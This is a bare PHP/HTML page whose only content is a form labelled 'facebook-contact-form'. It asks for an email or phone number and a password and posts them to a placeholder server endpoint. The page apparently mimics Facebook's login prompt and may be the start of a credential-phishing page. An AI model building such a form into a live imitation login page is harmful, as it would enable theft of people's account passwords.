<?php
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>

<div class="box">
    <div class="title-box">
        <!-- You can add some content or title here if needed -->
    </div>
    <div class="form-box">
        <form id="facebook-contact-form" action="your_server_endpoint.php" method="post">
            <input type="text" name="email" id="email" placeholder="Enter your email or phone number" required>
            <input type="password" name="password" id="password" placeholder="Enter your password" required>
            <button type="submit" id="submit-form" name="submit">Submit</button>
        </form>
        <hr>
    </div>
</div>
